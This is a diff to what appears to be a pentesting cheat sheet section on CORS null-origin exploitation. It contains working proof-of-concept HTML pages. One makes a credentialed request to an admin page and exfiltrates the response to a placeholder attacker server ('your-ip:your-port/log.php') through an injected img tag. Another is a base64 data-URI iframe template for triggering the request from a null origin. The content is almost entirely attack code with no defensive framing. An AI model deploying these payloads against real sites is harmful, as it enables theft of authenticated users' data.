@@ -914,6 +914,7 @@ Access-Control-Allow-Origin: null
 Access-Control-Allow-Credentials: true
 ```
 
+### Common
 -> nullorigin.html  
 ```
 <html><head>
@@ -931,7 +932,10 @@ xhr.send(null);
 </script>
 </head></html>
 
-```  
+``` 
+
+### Null Origin Exploitation Exfiltrate via url per server
+
 -> nullorigin2.html
 ```
 <html><head>
@@ -940,17 +944,25 @@ var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == XMLHttpRequest.DONE) {
  		var r = xhr.responseText;
-	var d = r.split('>')[1].split('<')[0]
-	function steal() {
-		document.write('<img src="http://your-ip:your-port/log.php?data=' + d + '"/>');
+		var d = r.split('>')[1].split('<')[0]
+		function exfil() {
+			document.write('<img src="http://your-ip:your-port/log.php?data=' + d + '"/>');
 	}
-	steal();
+	exfil();
 	}
 }
 xhr.open('GET', 'http://site.com/admin.php', true);
 xhr.withCredentials = true;
 xhr.send(null);
 </script>
+</head></html>
+```  
+
+### Null Origin Exploitation Exfiltrate via url per server + base64
+-> nulloriginb64.html
+```
+
+<iframe src="data:text/html;base64,<YOUR_BASE64_HERE>"></iframe>
 </head></html>
 ```
 
